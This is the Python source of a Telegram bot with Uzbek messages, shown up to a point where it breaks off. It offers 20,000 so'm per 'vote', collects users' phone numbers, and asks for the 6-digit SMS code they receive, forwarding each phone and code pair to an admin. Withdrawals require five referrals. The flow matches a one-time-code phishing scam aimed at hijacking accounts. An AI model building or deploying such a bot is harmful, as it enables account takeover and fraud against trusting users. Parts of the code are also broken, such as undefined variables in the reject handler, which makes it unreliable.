import asyncio
import asyncpg
import os
import logging
import re
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 10000))

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

user_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🗳️ Ovoz berish")],
        [KeyboardButton(text="💳 Hamyon"), KeyboardButton(text="💰 Balans")],
        [KeyboardButton(text="💸 Yechish")],
        [KeyboardButton(text="🔗 Referal link")]
    ],
    resize_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📊 Statistika")],
        [KeyboardButton(text="📨 Barchaga xabar")],
        [KeyboardButton(text="📋 Kutayotgan kodlar")],
        [KeyboardButton(text="💸 Yechish so'rovlari")]
    ],
    resize_keyboard=True
)

# ================= TELEFON RAQAMNI TEKSHIRISH =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            return True
    
    return False

# ================= DATABASE =================
async def get_db():
    try:
        conn = await asyncpg.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    conn = None
    try:
        conn = await get_db()
        
        # Users jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Codes jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Transactions jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Withdraws jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(20) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database xatosi: {e}")
        raise
    finally:
        if conn:
            await conn.close()

# ================= DATABASE MIGRASIYA =================
async def migrate_db():
    """Database jadvallarini yangilash"""
    conn = None
    try:
        conn = await get_db()
        
        # referal_count ustuni
        await conn.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (
                    SELECT 1 FROM information_schema.columns 
                    WHERE table_name='users' AND column_name='referal_count'
                ) THEN
                    ALTER TABLE users ADD COLUMN referal_count INTEGER DEFAULT 0;
                END IF;
            END $$;
        """)
        
        # card_number ustuni
        await conn.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (
                    SELECT 1 FROM information_schema.columns 
                    WHERE table_name='users' AND column_name='card_number'
                ) THEN
                    ALTER TABLE users ADD COLUMN card_number VARCHAR(50) DEFAULT NULL;
                END IF;
            END $$;
        """)
        
        # withdraw_phone ustuni
        await conn.execute("""
            DO $$
            BEGIN
                IF NOT EXISTS (
                    SELECT 1 FROM information_schema.columns 
                    WHERE table_name='users' AND column_name='withdraw_phone'
                ) THEN
                    ALTER TABLE users ADD COLUMN withdraw_phone VARCHAR(20) DEFAULT NULL;
                END IF;
            END $$;
        """)
        
        # referrals jadvali
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT NOT NULL,
                referred_id BIGINT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        logger.info("✅ Database migratsiya muvaffaqiyatli")
    except Exception as e:
        logger.error(f"❌ Migratsiya xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= REFERAL LINK GENERATE =================
async def generate_referal_link(telegram_id):
    try:
        bot_info = await bot.get_me()
        bot_username = bot_info.username
        return f"https://t.me/{bot_username}?start=ref_{telegram_id}"
    except Exception as e:
        logger.error(f"❌ Bot username olishda xatolik: {e}")
        return f"https://t.me/Open_budget?start=ref_{telegram_id}"

# ================= 1. START =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    args = message.text.split()
    referal_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referal_id = int(args[1].replace("ref_", ""))
            logger.info(f"🔗 Referal: {referal_id} → {telegram_id}")
        except:
            pass
    
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 Xush kelibsiz, Admin!",
            reply_markup=admin_menu
        )
        return
    
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO NOTHING",
            telegram_id, "no_phone_yet"
        )
        
        if referal_id and referal_id != telegram_id:
            existing = await conn.fetchval(
                "SELECT id FROM referrals WHERE referred_id = $1",
                telegram_id
            )
            
            if not existing:
                await conn.execute(
                    "INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2)",
                    referal_id, telegram_id
                )
                await conn.execute(
                    "UPDATE users SET referal_count = referal_count + 1 WHERE telegram_id = $1",
                    referal_id
                )
                logger.info(f"✅ Referal saqlandi: {referal_id} → {telegram_id}")
        
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        referal_link = await generate_referal_link(telegram_id)
        referal_count = user['referal_count'] if 'referal_count' in user else 0
        
        if user['phone'] == "no_phone_yet" or user['phone'] is None:
            user_states[telegram_id] = "waiting_phone"
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = 20 000 SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ 20 000 so'm olasiz!\n\n"
                f"🔗 <b>Referal link:</b> {referal_link}\n"
                f"👥 <b>Referallar soni:</b> {referal_count}\n\n"
                f"⚡️ <b>Tez va oson!</b>\n"
                f"💎 <b>Kafolatlangan to'lov!</b>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>\n"
                f"(Kontakt tugmasi yoki qo'lda yozing)",
                reply_markup=phone_keyboard,
                parse_mode="HTML"
            )
        else:
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {user['phone']}\n"
                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n"
                f"👥 <b>Referallar soni:</b> {referal_count}\n"
                f"🔗 <b>Referal link:</b> {referal_link}\n\n"
                f"🎁 <b>Yana ovoz bering va yana 20 000 so'm oling!</b>\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=user_menu,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            await conn.close()

# ================= 2. OVOZ BERISH =================
@dp.message(lambda msg: msg.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        f"🗳️ <b>OVOZ BERISH</b>\n\n"
        f"💰 1 ta ovoz = 20 000 so'm\n\n"
        f"📱 Telefon raqamingizni yuboring:\n"
        f"(Kontakt tugmasi yoki qo'lda yozing)",
        reply_markup=phone_keyboard,
        parse_mode="HTML"
    )

# ================= 3. TELEFON RAQAM (Kontakt) =================
@dp.message(lambda msg: msg.contact is not None)
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    current_state = user_states.get(telegram_id)
    if current_state != "waiting_phone":
        logger.info(f"👤 Holat o'zgartirildi: {current_state} → waiting_phone ({telegram_id})")
        user_states[telegram_id] = "waiting_phone"
        await message.answer(
            "📱 Telefon raqamingiz qabul qilindi!",
            reply_markup=types.ReplyKeyboardRemove()
        )
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

# ================= 4. TELEFON RAQAM (Qo'lda) =================
@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

# ================= 4.1 TELEFON RAQAMNI QABUL QILISH =================
async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    except Exception as e:
        logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    await message.answer(
        f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
        f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:",
        parse_mode="HTML"
    )
    
    try:
        user_info = await bot.get_chat(telegram_id)
        username = user_info.username if user_info.username else "mavjud_emas"
        
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"👤 Username: @{username}\n"
            f"⏳ Kod kutilmoqda...",
            parse_mode="HTML"
        )
        logger.info(f"✅ Admin xabari yuborildi (telefon): {telegram_id}")
    except Exception as e:
        logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")

# ================= 5. KODNI QABUL QILISH =================
@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
        logger.info(f"✅ Kod saqlandi: {telegram_id} - {code}")
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    await message.answer(
        "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
        reply_markup=user_menu
    )
    
    try:
        user_info = await bot.get_chat(telegram_id)
        username = user_info.username if user_info.username else "mavjud_emas"
        
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
                    InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
                ]
            ]
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kod: <code>{code}</code>\n"
            f"👤 Username: @{username}",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        logger.info(f"✅ Admin xabari yuborildi (kod): {telegram_id}")
        
    except Exception as e:
        logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
        await bot.send_message(
            ADMIN_ID,
            f"❌ Xatolik: {e}\nID: {telegram_id}\nKod: {code}"
        )
    
    user_states[telegram_id] = "done"

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = None
        try:
            conn = await get_db()
            result = await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "UPDATE users SET balance = balance + 20000 WHERE telegram_id = $1",
                    telegram_id
                )
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount, type) VALUES ($1, 20000, 'deposit')",
                    telegram_id
                )
                
                new_balance = await conn.fetchval(
                    "SELECT balance FROM users WHERE telegram_id = $1",
                    telegram_id
                )
                
                referal_count = await conn.fetchval(
                    "SELECT COALESCE(referal_count, 0) FROM users WHERE telegram_id = $1",
                    telegram_id
                )
                
                try:
                    await bot.send_message(
                        telegram_id,
                        f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                        f"💰 Hisobingizga <b>+20 000 so'm</b> qo'shildi!\n\n"
                        f"📊 Joriy balans: <b>{new_balance:,} so'm</b>\n"
                        f"👥 Referallar: {referal_count}/5",
                        reply_markup=user_menu,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                
                await callback.message.edit_text(
                    f"✅ <b>TASDIQLANDI!</b>\n\n"
                    f"👤 <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
                    f"🆔 ID: {telegram_id}\n"
                    f"📞 Tel: {phone}\n"
                    f"🔑 Kod: {code}\n"
                    f"💰 +20 000 so'm",
                    parse_mode="HTML"
                )
                await callback.answer("✅ Tasdiqlandi!")
            else:
                await callback.answer("❌ Kod allaqachon ishlangan yoki noto'g'ri!")
                
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer(f"❌ Xatolik: {e}")
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE codes SET status = 'rejected' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\n"
                    "📌 Siz allaqachon ovoz bergansiz yoki kod xato.\n"
                    "🔄 Qaytadan: 🗳️ Ovoz berish tugmasini bosing.",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"👤 <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
                f"🆔 ID: {telegram_id}\n"
                f"📞 Tel: {phone}\n"
                f"🔑 Kod: {code}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!")
        finally:
            if conn:
                await conn.close()

# ================= 7. HAMYON / BALANS =================
@dp.message(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone, COALESCE(referal_count, 0) as referal_count FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(
            f"💳 <b>Hamyon</b>\n\n"
            f"💰 Balans: {user['balance']:,} so'm\n"
            f"👥 Referallar: {user['referal_count']}/5\n\n"
            f"💸 Yechish uchun:\n"
            f"• Balans: 20 000+ so'm\n"
            f"• Referallar: 5+ ta",
            reply_markup=user_menu,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 8. YECHISH =================
@dp.message(lambda msg: msg.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone, COALESCE(referal_count, 0) as referal_count FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        balance = user['balance']
        referal_count = user['referal_count']
        
        if balance < 20000:
            await message.answer(
                f"❌ Balans: {balance:,} so'm\n"
                f"💰 Yechish uchun kamida 20 000 so'm kerak!\n"
                f"Yana {20000 - balance:,} so'm kerak.\n\n"
                f"🗳️ Ovoz berish tugmasini bosing!",
                reply_markup=user_menu
            )
            return
        
        if referal_count < 5:
            referal_link = await generate_referal_link(telegram_id)
            await message.answer(
                f"❌ Referallar: {referal_count}/5\n\n"
                f"👥 Yechish uchun kamida 5 ta referal kerak!\n"
                f"🔗 Referal link: {referal_link}\n\n"
                f"📤 Do'stlaringizni taklif qiling!",
                reply_markup=user_menu,
                parse_mode="HTML"
            )
            return
        
        withdraw_states[telegram_id] = "waiting_card_or_phone"
        await message.answer(
            f"✅ <b>Barcha shartlar bajarildi!</b>\n\n"
            f"💰 Balans: {balance:,} so'm\n"
            f"👥 Referallar: {referal_count}/5\n\n"
            f"💳 <b>Karta raqamingizni</b> yoki\n"
            f"📱 <b>Telefon raqamingizni</b> yuboring:\n\n"
            f"(Masalan: 8600 1234 5678 9012 yoki +998901234567)",
            reply_markup=types.ReplyKeyboardRemove(),
            parse_mode="HTML"
        )
        
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 9. KARTA YOKI TELEFON QABUL QILISH =================
@dp.message(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_card_or_phone")
async def withdraw_card_or_phone(message: types.Message):
    telegram_id = message.from_user.id
    data = message.text.strip()
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, COALESCE(referal_count, 0) as referal_count FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Xatolik! /start bosing")
            withdraw_states.pop(telegram_id, None)
            return
        
        if data.startswith('+') or data.replace(' ', '').isdigit():
            if len(data.replace(' ', '')) >= 13:
                await conn.execute(
                    "UPDATE users SET card_number = $1 WHERE telegram_id = $2",
                    data, telegram_id
                )
            else:
                await conn.execute(
                    "UPDATE users SET withdraw_phone = $1 WHERE telegram_id = $2",
                    data, telegram_id
                )
        
        user_info = await bot.get_chat(telegram_id)
        username = user_info.username if user_info.username else "mavjud_emas"
        
        phone_from_db = await conn.fetchval(
            "SELECT phone FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{user['balance']}"),
                    InlineKeyboardButton(text="❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
                ]
            ]
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"💸 <b>YECHISH SO'ROVI</b>\n\n"
            f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"👤 Username: @{username}\n"
            f"💰 Balans: {user['balance']:,} so'm\n"
            f"👥 Referallar: {user['referal_count']}\n"
            f"📞 Telefon: {phone_from_db}\n"
            f"💳 Karta: {data if len(data.replace(' ', '')) >= 13 else '❌'}\n"
            f"📱 Tel (yechish): {data if len(data.replace(' ', '')) < 13 else '❌'}",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        
        await message.answer(
            f"✅ Ma'lumotlaringiz qabul qilindi!\n"
            f"Admin tekshirib, to'lovni amalga oshiradi.",
            reply_markup=user_menu
        )
        
        await conn.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) "
            "VALUES ($1, $2, $3, 'pending')",
            telegram_id, data, user['balance']
        )
        
        withdraw_states.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Karta/telefon qabul qilishda xatolik: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            await conn.close()

# ================= 10. ADMIN YECHISH =================
@dp.callback_query(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[1]
    
    if action == "done":
        telegram_id = int(data[2])
        amount = int(data[3])
        
        conn = None
        try:
            conn = await get_db()
            
            await conn.execute(
                "UPDATE users SET balance = 0 WHERE telegram_id = $1",
                telegram_id
            )
            await conn.execute(
                "UPDATE withdraws SET status = 'completed' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n💰 Summa: {amount:,} so'm",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"✅ To'landi!\n"
                f"👤 <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
                f"💰 {amount:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("✅ To'landi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[2])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE withdraws SET status = 'rejected' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(telegram_id, "❌ So'rov rad etildi!", reply_markup=user_menu)
            except:
                pass
            
            await callback.message.edit_text(
                f"❌ Rad etildi!\n"
                f"👤 <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
                f"ID: {telegram_id}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
        finally:
            if conn:
                await conn.close()

# ================= 11. REFERAL LINK =================
@dp.message(lambda msg: msg.text == "🔗 Referal link")
async def get_referal_link(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz!")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT COALESCE(referal_count, 0) as referal_count FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz! /start")
            return
        
        referal_link = await generate_referal_link(telegram_id)
        referal_count = user['referal_count']
        
        if referal_count >= 5:
            status_text = "✅ Yechish mumkin!"
        else:
            status_text = f"⏳ Yana {5 - referal_count} ta referal kerak"
        
        await message.answer(
            f"🔗 <b>Referal link</b>\n\n"
            f"📎 {referal_link}\n\n"
            f"👥 Referallar: {referal_count}/5\n"
            f"{status_text}\n\n"
            f"💡 Do'stlaringizni taklif qiling!",
            reply_markup=user_menu,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Referal link xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 12. ADMIN STATISTIKA =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        total_users = await conn.fetchval("SELECT COUNT(*) FROM users")
        registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
        unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        pending_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        total_referals = await conn.fetchval("SELECT COUNT(*) FROM referrals")
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Jami foydalanuvchilar: {total_users}\n"
            f"✅ Ro'yxatdan o'tganlar: {registered_users}\n"
            f"⏳ Telefon kiritmaganlar: {unregistered_users}\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"🔗 Jami referallar: {total_referals}\n"
            f"⏳ Kutayotgan kodlar: {pending}\n"
            f"✅ Tasdiqlangan kodlar: {verified}\n"
            f"💸 Yechish so'rovlari: {pending_withdraws}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 13. KUTAYOTGAN KODLAR =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"👤 <a href='tg://user?id={c['telegram_id']}'>🔗 Profil</a>\n"
                text += f"🆔 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 14. YECHISH SO'ROVLARI =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        withdraws = await conn.fetch(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"👤 <a href='tg://user?id={w['telegram_id']}'>🔗 Profil</a>\n"
                text += f"🆔 ID: <code>{w['telegram_id']}</code>\n"
                text += f"📱 Tel: <code>{w['phone']}</code>\n"
                text += f"💰 Summa: <code>{w['amount']:,} so'm</code>\n"
